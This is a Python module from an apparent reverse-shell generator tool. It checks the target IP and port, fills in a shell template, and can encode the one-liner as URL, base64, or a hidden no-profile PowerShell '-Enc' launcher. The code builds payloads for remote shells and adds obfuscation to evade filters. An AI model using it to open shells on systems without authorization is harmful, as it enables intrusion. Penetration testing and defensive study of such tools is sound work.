"""Turn a (template, ip, port, encoding) tuple into the final one-liner."""

from __future__ import annotations

import base64
import ipaddress
import urllib.parse
from enum import Enum

from revshell_gen.templates import ShellTemplate


class Encoding(str, Enum):
    RAW = "raw"
    URL = "url"
    URL_DOUBLE = "url-double"
    BASE64 = "base64"
    POWERSHELL_BASE64 = "powershell-base64"


class InvalidPortError(ValueError):
    pass


class InvalidIPError(ValueError):
    pass


def validate_port(port: int) -> None:
    if not (0 < port < 65536):
        raise InvalidPortError(f"Port must be between 1 and 65535, got {port}.")


def validate_ip(ip: str) -> None:
    """Accept IPv4/IPv6 addresses as well as hostnames (revshells.com allows
    hostnames too, e.g. for use with ngrok/Tailscale names)."""
    try:
        ipaddress.ip_address(ip)
        return
    except ValueError:
        pass

    if not ip or " " in ip:
        raise InvalidIPError(f"'{ip}' does not look like a valid IP or hostname.")


def encode(command: str, encoding: Encoding) -> str:
    if encoding == Encoding.RAW:
        return command
    if encoding == Encoding.URL:
        return urllib.parse.quote(command, safe="")
    if encoding == Encoding.URL_DOUBLE:
        return urllib.parse.quote(urllib.parse.quote(command, safe=""), safe="")
    if encoding == Encoding.BASE64:
        return base64.b64encode(command.encode()).decode()
    if encoding == Encoding.POWERSHELL_BASE64:
        encoded = base64.b64encode(command.encode("utf-16-le")).decode()
        return f"powershell -NoP -NonI -W Hidden -Enc {encoded}"
    raise ValueError(f"Unknown encoding: {encoding}")


def generate(
    template: ShellTemplate,
    ip: str,
    port: int,
    encoding: Encoding = Encoding.RAW,
) -> str:
    """Render `template` with `ip`/`port` and apply `encoding`."""
    validate_ip(ip)
    validate_port(port)

    rendered = template.render(ip=ip, port=port)
    return encode(rendered, encoding)
